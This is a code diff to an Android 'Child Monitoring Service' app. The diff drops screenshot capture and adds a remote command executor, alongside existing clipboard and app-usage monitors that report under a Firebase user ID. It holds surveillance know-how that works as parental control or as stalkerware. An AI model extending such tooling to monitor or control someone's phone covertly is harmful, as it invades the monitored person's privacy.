@@ -7,10 +7,10 @@ import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.ServiceInfo;
-import android.media.projection.MediaProjection;
-import android.media.projection.MediaProjectionManager;
 import android.os.Build;
+import android.os.Handler;
 import android.os.IBinder;
+import android.os.Looper;
 import android.text.TextUtils;
 import android.util.Log;
 import java.net.URISyntaxException;
@@ -23,14 +23,14 @@ import com.google.firebase.auth.FirebaseAuth;
 public class MonitoringService extends Service {
     private static final String TAG = "MonitoringService";
     private static final String CHANNEL_ID = "MonitoringServiceChannel";
-    private CommandListener commandListener; // CommandListener initialization
-    private MediaProjection mediaProjection;
-    private ScreenshotHelper screenshotHelper;
+    private CommandListener commandListener; 
+    private CommandExecutor commandExecutor;
+    private String userId;
+    private String phoneModel; // using phoneModel as deviceId
 
     @Override
     public void onCreate() {
         super.onCreate();
-        screenshotHelper = new ScreenshotHelper(this);
     }
 
     @Nullable
@@ -41,58 +41,33 @@ public class MonitoringService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        if (intent != null && intent.hasExtra("resultCode")) {
-            try {
-                int resultCode = intent.getIntExtra("resultCode", 0);
-                Intent data = Intent.parseUri(intent.getStringExtra("intentData"), Intent.URI_INTENT_SCHEME);
-
-                MediaProjectionManager projectionManager =
-                        (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
-                mediaProjection = projectionManager.getMediaProjection(resultCode, data);
-
-                if (mediaProjection != null) {
-                    screenshotHelper.setMediaProjection(mediaProjection);
-                }
-            } catch (URISyntaxException e) {
-                Log.e(TAG, "Error parsing intent URI: " + e.getMessage());
-                return START_NOT_STICKY;
-            }
+        // Get user ID from Firebase Auth
+        FirebaseAuth auth = FirebaseAuth.getInstance();
+        if (auth.getCurrentUser() != null) {
+            userId = auth.getCurrentUser().getUid();
+            phoneModel = android.os.Build.MODEL;
         }
-
-        Log.d(TAG, "Service started");
-
-        // Check if required permissions and accessibility service are granted
-//        if (!PermissionHelper.isForegroundServicePermissionGranted(this) ||
-//                !PermissionHelper.isLocationPermissionGranted(this) ||
-//                !PermissionHelper.areCorePermissionsGranted(this)) {
-//            Log.e(TAG, "Required permissions or accessibility service not granted. Stopping service.");
-//            showPermissionActivity(); // Start PermissionActivity to request permissions
-//            return START_NOT_STICKY;
-//        }
-
+        
+        // Start foreground service first
         createNotificationChannel();
+        startForeground();
+        
+        // Initialize command executor with valid context
+        initCommandExecutor();
+        
+        startMonitoringService();
+        return START_STICKY;
+    }
 
+    private void startForeground() {
         Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                 .setContentTitle("Child Monitoring Service")
-                .setContentText("Monitoring location in the background.")
+                .setContentText("Monitoring active")
                 .setSmallIcon(R.drawable.ic_launcher_foreground)
                 .setPriority(NotificationCompat.PRIORITY_LOW)
                 .build();
 
-        try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
-            } else {
-                startForeground(1, notification);
-            }
-        } catch (Exception e) {
-            Log.e(TAG, "Error starting foreground service: " + e.getMessage());
-            stopSelf();
-            return START_NOT_STICKY;
-        }
-
-        startMonitoringService(); // Start monitoring tasks
-        return START_STICKY;
+        startForeground(1, notification);
     }
 
     private void startMonitoringService() {
@@ -113,7 +88,7 @@ public class MonitoringService extends Service {
             if (TextUtils.isEmpty(userId)) {
                 Log.e(TAG, "User ID is null or empty.");
                 stopSelf();
-                return;
+                return; 
             }
 
             if (TextUtils.isEmpty(phoneModel)) {
@@ -133,7 +108,7 @@ public class MonitoringService extends Service {
             startAppUsageMonitor(userId, phoneModel);
             startClipboardMonitor(userId, phoneModel); // Added Clipboard Monitor
             initializeCommandListener(userId, phoneModel); // Initialize CommandListener
-            startScreenshotMonitor(userId, phoneModel); // Initialize ScreenshotMonitor
+            //startScreenshotMonitor(userId, phoneModel); // Initialize ScreenshotMonitor
 
 
         } catch (Exception e) {
@@ -200,19 +175,19 @@ public class MonitoringService extends Service {
         serviceIntent.putExtra("userId", userId);
         serviceIntent.putExtra("phoneModel", phoneModel);
 
-        startService(serviceIntent);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(serviceIntent);
+        } else {
+            startService(serviceIntent);
+        }
     }
 
     private void initializeCommandListener(String userId, String phoneModel) {
         Log.d(TAG, "Initializing Command Listener");
-        commandListener = new CommandListener(userId, phoneModel, this); // Pass the context
-        commandListener.startListeningForCommands(); // Start listening for commands
-    }
-
-    private void startScreenshotMonitor(String userId, String phoneModel) {
-        Log.d(TAG, "Initializing Screenshot Monitor");
-        ScreenshotMonitor screenshotMonitor = new ScreenshotMonitor(this); // Adjusted constructor
-        screenshotMonitor.startMonitoring(); // Start monitoring screenshots without arguments
+        commandExecutor = new CommandExecutor(userId, phoneModel, this);
+        commandListener = new CommandListener(userId, phoneModel, this);
+        commandListener.setCommandExecutor(commandExecutor);
+        commandListener.startListeningForCommands();
     }
 
     private void createNotificationChannel() {
@@ -235,5 +210,16 @@ public class MonitoringService extends Service {
         Intent intent = new Intent(this, PermissionActivity.class);
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         startActivity(intent);
+    }
+
+    private void initCommandExecutor() {
+        if (userId == null || phoneModel == null) {
+            Log.e(TAG, "Cannot initialize CommandExecutor - missing userId or deviceId");
+            return;
+        }
+        
+        // Get application context to ensure we have a valid context
+        Context appContext = getApplicationContext();
+        commandExecutor = new CommandExecutor(userId, phoneModel, appContext);
     }
 }
